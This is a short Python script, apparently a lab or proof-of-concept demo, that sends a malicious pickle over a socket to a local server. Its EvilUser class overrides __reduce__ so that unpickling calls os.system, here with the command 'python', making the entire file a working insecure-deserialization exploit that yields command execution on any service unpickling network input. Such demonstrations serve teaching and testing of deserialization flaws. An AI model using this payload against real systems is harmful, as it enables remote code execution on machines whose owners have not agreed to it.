import socket, pickle, os

HOST = "127.0.0.1"
PORT = 12345

class EvilUser:
    def __init__(self):
        self.username = "Evil User"

    def __reduce__(self):
        cmd = 'python'
        return os.system, (cmd,)

user = EvilUser()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((HOST, PORT))
    
    # Send the length of the object, and then the object as a list of bytes
    obj = pickle.dumps(user)
    print(f"Length of object: {str(len(obj))}")
    sock.sendall(len(obj).to_bytes(4, "little"))
    sock.sendall(obj)